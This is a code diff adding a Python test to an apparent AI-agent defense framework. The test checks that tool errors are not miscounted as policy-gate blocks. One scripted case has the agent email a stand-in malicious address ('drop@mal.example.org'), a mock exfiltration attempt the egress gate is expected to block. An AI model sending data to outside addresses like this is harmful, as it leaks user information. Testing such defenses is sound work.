@@ -160,3 +160,70 @@ def test_workflow_document_joins_by_call_id_not_position():
     blocked = [a for a in actions if a["decision"] == "BLOCK"]
     assert [a["call_id"] for a in blocked] == ["S#0"], blocked
     assert blocked[0]["rule"] == "egress.email_domains"
+
+
+def test_tool_error_is_not_reported_as_gate_block():
+    """★도구 오류를 게이트 성과로 둔갑시키지 않는다★ — outcome 분류 회귀 방지.
+
+    회귀 이력: loop.py 는 실행 직전에 gate_decision='ALLOW' 를 확정하고, 도구가 예외를
+    던지면 executed 만 False 로 남긴다. 표시 계층이 `!executed` 를 차단으로 읽어
+    CLI 에 "ALLOW → 차단" 이라는 자기모순 줄이 찍혔고, summary.blocked 까지 1 올랐다.
+    데모 중 도구가 한 번만 실패해도 게이트가 막은 것처럼 보인다.
+    """
+    import asyncio
+
+    from src.agent.loop import run_episode
+    from src.agent.policy import DefenseHooks
+    from src.agent.toolworld import default_world
+    from src.agent.workflow import (WorkflowRecorderProvider, format_workflow_text,
+                                    workflow_document)
+    from src.config import gen_config, load_policy
+    from src.providers.base import GenResult, ToolCall
+
+    class _One:
+        name = "one"
+
+        def __init__(self, call: ToolCall) -> None:
+            self.call, self.turn = call, 0
+
+        async def generate(self, messages, cfg):          # noqa: ARG002
+            self.turn += 1
+            if self.turn == 1:
+                return GenResult(text="", finish_reason="tool_calls", tool_calls=[self.call])
+            return GenResult(text="끝", tool_calls=[], finish_reason="stop")
+
+    def _run(call: ToolCall) -> dict:
+        async def _go():
+            policy = load_policy()
+            rec = WorkflowRecorderProvider(_One(call), mode="scripted")
+            ep = await run_episode("t", rec, gen_config(policy),
+                                   hooks=DefenseHooks(policy, {"tier_a": True}, rail=None),
+                                   world=default_world(), defenses={"tier_a": True},
+                                   scenario="c", episode_id="outcome00000")
+            return workflow_document(ep, rec, rail_name="n", defenses={"tier_a": True},
+                                     provider_label="p", model="n")
+        return asyncio.run(_go())
+
+    # ① 도구가 예외 → 게이트는 ALLOW 였으므로 차단이 아니다
+    err = _run(ToolCall(name="lookup_customer",
+                        args={"phone": "010-1234-5678", "email": "x@y.z"}, call_id="A"))
+    act = err["turns"][0]["actions"][0]
+    assert act["outcome"] == "error", act
+    assert act["decision"] == "ALLOW"
+    assert err["summary"]["blocked"] == 0, "도구 오류가 blocked 로 집계됐다"
+    assert err["summary"]["errored"] == 1
+    assert "ALLOW → 차단" not in format_workflow_text(err), "자기모순 문구가 다시 나타났다"
+
+    # ② 진짜 게이트 차단은 그대로 blocked
+    blk = _run(ToolCall(name="send_email",
+                        args={"to": "drop@mal.example.org", "subject": "s", "body": "b"},
+                        call_id="B"))
+    a2 = blk["turns"][0]["actions"][0]
+    assert a2["outcome"] == "blocked" and a2["decision"] == "BLOCK"
+    assert blk["summary"]["blocked"] == 1 and blk["summary"]["errored"] == 0
+
+    # ③ 정상 실행
+    ok = _run(ToolCall(name="search_kb", args={"query": "환불"}, call_id="C"))
+    a3 = ok["turns"][0]["actions"][0]
+    assert a3["outcome"] == "executed"
+    assert ok["summary"]["blocked"] == 0 and ok["summary"]["errored"] == 0
